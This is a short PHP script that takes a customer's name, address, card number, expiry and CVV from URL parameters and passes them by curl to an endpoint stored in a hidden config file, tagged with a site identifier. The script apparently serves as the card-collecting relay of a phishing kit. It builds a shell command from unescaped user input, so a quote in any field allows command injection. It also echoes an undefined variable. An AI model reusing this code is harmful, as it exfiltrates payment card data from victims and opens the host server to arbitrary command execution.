<?php
$end_point = trim(file_get_contents('.aconf'));
$site = trim(file_get_contents('.sconf'));

$request = $end_point."add_payment?"
	."fullname=".$_GET['fullname']."&"
	."email=".$_GET['email']."&"
	."address=".$_GET['address']."&"
	."city=".$_GET['city']."&"
	."state=".$_GET['state']."&"
	."zip=".$_GET['zip']."&"
	."cardname=".$_GET['cardname']."&"
	."cardnumber=".$_GET['cardnumber']."&"
	."expmonth=".$_GET['expmonth']."&"
	."expyear=".$_GET['expyear']."&"
	."cvv=".$_GET['cvv']."&"
	."sameaddr=".$_GET['sameadr']."&"
	."site=".$site;

$resp = shell_exec("curl "."'".preg_replace('/\s+/', '_', $request)."'");

echo $resp;
echo $req;
?>

